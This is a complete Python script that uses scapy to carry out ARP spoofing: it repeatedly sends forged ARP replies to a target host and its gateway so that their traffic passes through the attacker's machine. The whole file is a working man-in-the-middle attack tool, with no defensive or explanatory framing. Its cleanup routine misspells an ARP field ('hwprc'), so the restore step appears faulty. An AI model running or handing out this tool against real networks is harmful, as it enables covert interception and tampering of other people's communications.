import argparse
import scapy.all as scapy
import time
parse = argparse.ArgumentParser()
parse.add_argument("--IP",help="IP to poisin")
parse.add_argument("--Gateway",help="IP the gateway")
args = parse.parse_args()
def get_mac(ip):
  arp_request = scapy.ARP(pdst=ip)
  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arp_request_broadcast = broadcast / arp_request
  answered = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0] 
  return answered[0][1].hwsrc
def restore(destination_ip,source_ip):
   destination_mac = get_mac(destination_ip)  
   source_mac = get_mac(source_ip)
   packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac,psrc=source_ip,hwprc=source_mac)
   scapy.send(packet,count=4,verbose=False)
def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)
sent_packets_count = 0    
try:
  while True:    
     spoof(args.IP,args.Gateway)  
     spoof(args.Gateway,args.IP)
     sent_packets_count += 2 
     print("\rPackets sent: " + str(sent_packets_count),end="")
     time.sleep(2)
except KeyboardInterrupt:
       print("Closed...")
       restore(args.IP,args.Gateway)
       restore(args.Gateway,args.IP)
